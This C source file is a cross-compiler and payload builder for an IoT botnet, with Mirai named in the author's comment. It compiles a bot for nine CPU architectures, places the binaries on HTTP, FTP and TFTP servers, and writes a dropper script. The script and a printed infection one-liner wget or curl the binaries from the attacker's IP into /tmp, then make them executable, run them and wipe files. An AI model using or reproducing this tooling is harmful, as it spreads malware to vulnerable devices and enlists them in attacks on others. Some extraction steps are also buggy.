/*

			Cross Compiler By vSparkzyy; 
	No i am not saying this was difficult to make bc it wasnt
	but i made it bc everyone mods cc7 or the mirai one and claims they "wrote it".
	and yes, ik i prolly went a lil over board but meh 
	
*/

#include <stdio.h>
#include <string.h>
#include <sys/stat.h>

char *botname = "client.c"; // Bot name lol 
char *bin_name = "Corona"; // Bin name you want 
char *ip = "1.1.1.1"; // should know by now what thats for? 

char title[2048];
char cmd[2048];

void payload()
{
	sprintf(title, "\033]0;[+] Cross Compiler Status: Setting Up Payload [+] \007");
	sprintf(cmd, "echo -ne '%s'", title);
	system(cmd); 
	printf("\x1b[37m[\x1b[35mCC\x1b[37m] Setting Up Payload... \r\n");
	char mips[512];
	sprintf(mips, "echo 'cd /tmp ; wget http://%s/%s.mips; curl -O http://%s/%s.mips;chmod 777 *;/tmp/%s.mips' >> /var/www/html/Corona.sh", ip, bin_name, ip, bin_name, bin_name);
	system(mips);
	
	char mipsel[512];
	sprintf(mipsel, "echo 'cd /tmp ; wget http://%s/%s.mipsel; curl -O http://%s/%s.mipsel;chmod 777 *;/tmp/%s.mipsel' >> /var/www/html/Corona.sh", ip, bin_name, ip, bin_name, bin_name);
	system(mipsel);
	
	char x86[512];
	sprintf(x86, "echo 'cd /tmp ; wget http://%s/%s.x86; curl -O http://%s/%s.x86;chmod 777 *;/tmp/%s.x86' >> /var/www/html/Corona.sh", ip, bin_name, ip, bin_name, bin_name);
	system(x86);
	
	char ppc[512];
	sprintf(ppc, "echo 'cd /tmp ; wget http://%s/%s.ppc; curl -O http://%s/%s.ppc;chmod 777 *;/tmp/%s.ppc' >> /var/www/html/Corona.sh", ip, bin_name, ip, bin_name, bin_name);
	system(ppc);
	
	char spc[512];
	sprintf(spc, "echo 'cd /tmp ; wget http://%s/%s.spc; curl -O http://%s/%s.spc;chmod 777 *;/tmp/%s.spc' >> /var/www/html/Corona.sh", ip, bin_name, ip, bin_name, bin_name);
	system(spc);
	
	char arm4[512];
	sprintf(arm4, "echo 'cd /tmp ; wget http://%s/%s.arm4; curl -O http://%s/%s.arm4;chmod 777 *;/tmp/%s.arm4' >> /var/www/html/Corona.sh", ip, bin_name, ip, bin_name, bin_name);
	system(arm4);
	
	char arm5[512];
	sprintf(arm5, "echo 'cd /tmp ; wget http://%s/%s.arm5; curl -O http://%s/%s.arm5;chmod 777 *;/tmp/%s.arm5' >> /var/www/html/Corona.sh", ip, bin_name, ip, bin_name, bin_name);
	system(arm5);
	
	char arm6[512];
	sprintf(arm6, "echo 'cd /tmp ; wget http://%s/%s.arm6; curl -O http://%s/%s.arm6;chmod 777 *;/tmp/%s.arm6' >> /var/www/html/Corona.sh", ip, bin_name, ip, bin_name, bin_name);
	system(arm6);
	
	char arm7[512];
	sprintf(arm7, "echo 'cd /tmp ; wget http://%s/%s.arm7; curl -O http://%s/%s.arm7;chmod 777 *;/tmp/%s.arm7' >> /var/www/html/Corona.sh", ip, bin_name, ip, bin_name, bin_name);
	system(arm7);
	
	printf("\r\n[\x1b[33mPayload\x1b[37m]\x1b[33m:\x1b[36m cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://%s/Corona.sh; curl -O http://%s/Corona.sh; chmod 777 Corona.sh; sh Corona.sh; rm -rf *\x1b[37m\r\n", ip, ip);
   
   	sprintf(title, "\033]0;[+] Cross Compiler Status: Completed! [+] \007");
	sprintf(cmd, "echo -ne '%s'", title);
	system(cmd); 
}
int isDirectoryExists(const char *path);
int isDirectoryExists(const char *path)
{
    struct stat stats;
    stat(path, &stats);
    // Check for file existence
    if (S_ISDIR(stats.st_mode))
        return 1;

    return 0;
}
void move()
{
	sprintf(title, "\033]0;[+] Cross Compiler Status: Moving Bins To /html [+] \007");
	sprintf(cmd, "echo -ne '%s'", title);
	system(cmd); 
	char path[50];
	strcpy(path, "/var/www/html");
    if (isDirectoryExists(path))
    {
        printf("\x1b[37m[\x1b[35mCC\x1b[37m] Directory /var/www/html Allready Exists \n");
    }
    else
    {
		system("mkdir /var/www/html");
		system("mkdir /var/ftp");
		system("mkdir /var/lib/tftpboot");
    }
	printf("\x1b[37m[\x1b[35mCC\x1b[37m] Moving Bins... \r\n");
	sleep(2);
	char html[1024];
	sprintf(html, "cp %s.* /var/www/html", bin_name);
	system(html);
	
	char ftp[1024];
	sprintf(ftp, "cp %s.* /var/ftp", bin_name);
	system(ftp);
	
	char tftp[1024];
	sprintf(tftp, "cp %s.* /var/lib/tftpboot/", bin_name);
	system(tftp);	
	
	char rmbins[1024];
	sprintf(rmbins, "rm -rf %s.* ", bin_name);
	system(rmbins);
	payload();
}

void compile()
{
	sprintf(title, "\033]0;[+] Cross Compiler Status: Compiling (1/9) [+] \007");
	sprintf(cmd, "echo -ne '%s'", title);
	system(cmd); 
	char mips[1024];
	printf("[\x1b[31mCompiled\x1b[37m] [MIPS] Compiling Mips (1/9) \r\n");
	sprintf(mips, "/root/bot/cross-compiler-mips/bin/mips-gcc -static -O3 -Os -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -w -D mips -o %s.mips %s -s", bin_name, botname);
	system(mips);
	
	sprintf(title, "\033]0;[+] Cross Compiler Status: Compiling (2/9) [+] \007");
	sprintf(cmd, "echo -ne '%s'", title);
	system(cmd); 
	char mipsel[1024];
	printf("[\x1b[31mCompiled\x1b[37m] [MIPSEL] Compiling Mipsel (2/9) \r\n");
	sprintf(mipsel, "/root/bot/cross-compiler-mipsel/bin/mipsel-gcc -static -O3 -Os -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -w -D mipsel -o %s.mipsel %s -s", bin_name, botname);
	system(mipsel);
	
	sprintf(title, "\033]0;[+] Cross Compiler Status: Compiling (3/9) [+] \007");
	sprintf(cmd, "echo -ne '%s'", title);
	system(cmd); 
	char x86[1024];
	printf("[\x1b[31mCompiled\x1b[37m] [X86] Compiling X86 (3/9) \r\n");
	sprintf(x86, "/root/bot/cross-compiler-x86_64/bin/x86_64-gcc -static -O3 -Os -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -w -D x86 -o %s.x86 %s -s", bin_name, botname);
	system(x86);
	
	sprintf(title, "\033]0;[+] Cross Compiler Status: Compiling (4/9) [+] \007");
	sprintf(cmd, "echo -ne '%s'", title);
	system(cmd); 
	char PPC[1024];
	printf("[\x1b[31mCompiled\x1b[37m] [PPC] Compiling PowerPC (4/9) \r\n");
	sprintf(PPC, "/root/bot/cross-compiler-powerpc/bin/powerpc-gcc -static -O3 -Os -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -w -D ppc -o %s.ppc %s -s", bin_name, botname);
	system(PPC);
	
	sprintf(title, "\033]0;[+] Cross Compiler Status: Compiling (5/9) [+] \007");
	sprintf(cmd, "echo -ne '%s'", title);
	system(cmd); 
	char spc[1024];
	printf("[\x1b[31mCompiled\x1b[37m] [SPC] Compiling Sparc (5/9)  \r\n");
	sprintf(spc, "/root/bot/cross-compiler-sparc/bin/sparc-gcc -static -O3 -Os -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -w -D sparc -o %s.spc %s -s", bin_name, botname);
	system(spc);
	
	sprintf(title, "\033]0;[+] Cross Compiler Status: Compiling (6/9) [+] \007");
	sprintf(cmd, "echo -ne '%s'", title);
	system(cmd); 
	char arm4[1024];
	printf("[\x1b[31mCompiled\x1b[37m] [ARM4] Compiling Armv4 (6/9) \r\n");
	sprintf(arm4, "/root/bot/cross-compiler-armv4l/bin/armv4l-gcc -static -O3 -Os -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -w -D arm4 -o %s.arm4 %s -s", bin_name, botname);
	system(arm4);
	
	sprintf(title, "\033]0;[+] Cross Compiler Status: Compiling (7/9) [+] \007");
	sprintf(cmd, "echo -ne '%s'", title);
	system(cmd); 
	char arm5[1024];
	printf("[\x1b[31mCompiled\x1b[37m] [ARM5] Compiling Armv5 (7/9) \r\n");
	sprintf(arm5, "/root/bot/cross-compiler-armv5l/bin/armv5l-gcc -static -O3 -Os -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -w -D arm5 -o %s.arm5 %s -s", bin_name, botname);
	system(arm5);
	
	sprintf(title, "\033]0;[+] Cross Compiler Status: Compiling (8/9) [+] \007");
	sprintf(cmd, "echo -ne '%s'", title);
	system(cmd); 
	char arm6[1024];
	printf("[\x1b[31mCompiled\x1b[37m] [ARM6] Compiling Armv6 (8/9) \r\n");
	sprintf(arm6, "/root/bot/cross-compiler-armv6l/bin/armv6l-gcc -static -O3 -Os -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -w -D arm6 -o %s.arm6 %s -s", bin_name, botname);
	system(arm6);
	
	sprintf(title, "\033]0;[+] Cross Compiler Status: Compiling (9/9) [+] \007");
	sprintf(cmd, "echo -ne '%s'", title);
	system(cmd); 
	char arm7[1024];
	printf("[\x1b[31mCompiled\x1b[37m] [ARM7] Compiling Armv7 (9/9) \r\n");
	sprintf(arm7, "/root/bot/cross-compiler-armv7l/bin/armv7l-gcc -static -O3 -Os -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -w -D arm7 -o %s.arm7 %s -s", bin_name, botname);
	system(arm7);
	
	system("rm -rf cross-compiler-*");
	printf("\x1b[37m[\x1b[35mCC\x1b[37m] Compiling Complete! \r\n");
	
	move();
}

void download()
{
	sprintf(title, "\033]0;[+] Cross Compiler Status: Downloading & Extracting (1/9) [+] \007");
	sprintf(cmd, "echo -ne '%s'", title);
	system(cmd); 
	printf("\x1b[37m[\x1b[36mDownload\x1b[37m] [MIPS] Downloading Mips (1/9) \r\n");
	system("wget -q http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2");
	printf("\x1b[37m[\x1b[33mExtract\x1b[37m]  [MIPS] Extracting  Mips (1/9) \r\n");
	system("tar -xf cross-compiler-mips.tar.bz2");
	sleep(1);
	sprintf(title, "\033]0;[+] Cross Compiler Status: Downloading & Extracting (2/9) [+] \007");
	sprintf(cmd, "echo -ne '%s'", title);
	system(cmd); 
	printf("\x1b[37m[\x1b[36mDownload\x1b[37m] [MIPSEL] Downloading Mipsel (2/9) \r\n");
	system("wget -q http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2");
	printf("\x1b[37m[\x1b[33mExtract\x1b[37m]  [MIPSEL] Extracting  Mipsel (2/9) \r\n");
	system("tar -xf cross-compiler-mipsel.tar.bz2");
	sleep(1);
	sprintf(title, "\033]0;[+] Cross Compiler Status: Downloading & Extracting (3/9) [+] \007");
	sprintf(cmd, "echo -ne '%s'", title);
	system(cmd); 
	printf("\x1b[37m[\x1b[36mDownload\x1b[37m] [X86] Downloading X86 (3/9) \r\n");
	system("wget -q http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-x86_64.tar.bz2");
	printf("\x1b[37m[\x1b[33mExtract\x1b[37m]  [X86] Extracting  X86 (3/9) \r\n");
	system("tar -xf cross-compiler-x86_64.tar.bz2");
	sleep(1);
	sprintf(title, "\033]0;[+] Cross Compiler Status: Downloading & Extracting (4/9) [+] \007");
	sprintf(cmd, "echo -ne '%s'", title);
	system(cmd); 
	printf("\x1b[37m[\x1b[36mDownload\x1b[37m] [PPC] Downloading PowerPC (4/9) \r\n");
	system("wget -q http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2");
	printf("\x1b[37m[\x1b[33mExtract\x1b[37m]  [PPC] Extracting  PowerPC (4/9) \r\n");
	system("tar -xf cross-compiler-powerpc.tar.bz2");
	sleep(1);
	sprintf(title, "\033]0;[+] Cross Compiler Status: Downloading & Extracting (5/9) [+] \007");
	sprintf(cmd, "echo -ne '%s'", title);
	system(cmd); 
	printf("\x1b[37m[\x1b[36mDownload\x1b[37m] [SPC] Downloading Sparc (5/9) \r\n");
	system("wget -q http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2");
	printf("\x1b[37m[\x1b[33mExtract\x1b[37m]  [SPC] Extracting  Sparc (5/9) \r\n");
	system("tar -xf cross-compiler-sparc.tar.bz2");
	sleep(1);
	sprintf(title, "\033]0;[+] Cross Compiler Status: Downloading & Extracting (6/9) [+] \007");
	sprintf(cmd, "echo -ne '%s'", title);
	system(cmd); 
	printf("\x1b[37m[\x1b[36mDownload\x1b[37m] [ARM4] Downloading Armv4 (6/9) \r\n");
	system("wget -q https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2");
	printf("\x1b[37m[\x1b[33mExtract\x1b[37m]  [ARM4] Extracting  Armv4 (6/9) \r\n");
	system("tar -xf cross-compiler-armv4l.tar.bz2");
	sleep(1);
	sprintf(title, "\033]0;[+] Cross Compiler Status: Downloading & Extracting (7/9) [+] \007");
	sprintf(cmd, "echo -ne '%s'", title);
	system(cmd); 
	printf("\x1b[37m[\x1b[36mDownload\x1b[37m] [ARM5] Downloading Armv5 (7/9) \r\n");
	system("wget -q https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2");
	printf("\x1b[37m[\x1b[33mExtract\x1b[37m]  [ARM5] Extracting  Armv5 (7/9) \r\n");
	system("tar -xf cross-compiler-armv4l.tar.bz2");
	sleep(1);
	sprintf(title, "\033]0;[+] Cross Compiler Status: Downloading & Extracting (8/9) [+] \007");
	sprintf(cmd, "echo -ne '%s'", title);
	system(cmd); 
	printf("\x1b[37m[\x1b[36mDownload\x1b[37m] [ARM6] Downloading Armv6 (8/9) \r\n");
	system("wget -q http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2");
	printf("\x1b[37m[\x1b[33mExtract\x1b[37m]  [ARM6] Extracting  Armv6 (8/9) \r\n");
	system("tar -xf cross-compiler-armv4l.tar.bz2");
	sleep(1);
	sprintf(title, "\033]0;[+] Cross Compiler Status: Downloading & Extracting (9/9) [+] \007");
	sprintf(cmd, "echo -ne '%s'", title);
	system(cmd); 
	printf("\x1b[37m[\x1b[36mDownload\x1b[37m] [ARM7] Downloading Armv7 (9/9) \r\n");
	system("wget -q https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv7l.tar.bz2");
	printf("\x1b[37m[\x1b[33mExtract\x1b[37m]  [ARM7] Extracting  Armv7 (9/9) \r\n");
	system("tar -xf cross-compiler-armv7l.tar.bz2");
	sleep(1);
	compile();
}



int main()
{
	printf("\e[2J\e[H"); //clears screen 
	sprintf(title, "\033]0;[+] Cross Compiler Status: Waiting [+] \007");
	sprintf(cmd, "echo -ne '%s'", title);
	system(cmd); 
	char option[20];
	printf("\x1b[37m[\x1b[35mCC\x1b[37m] Cross Compiler by vSparkzyy\r\n");
	printf("\x1b[37m[\x1b[35mCC\x1b[37m] Download the bins? (y/n) ");
	scanf("%s", &option);
	if(strstr(option, "y") || strstr(option, "Y"))
	{
		printf("\x1b[37m[\x1b[35mCC\x1b[37m] Setting up HTTP And TFTP \r\n");
		system("yum install wget -y &> /dev/null");
		system("service httpd start ");
		system("yum install xinetd tftp tftp-server -y &> /dev/null");
		system("yum install vsftpd -y &> /dev/null");
		system("service vsftpd start &> /dev/null");
		printf("\x1b[37m[\x1b[35mCC\x1b[37m] Procceding to download bins... \r\n");
		download();
	}
	else 
	{
		payload();
	}
}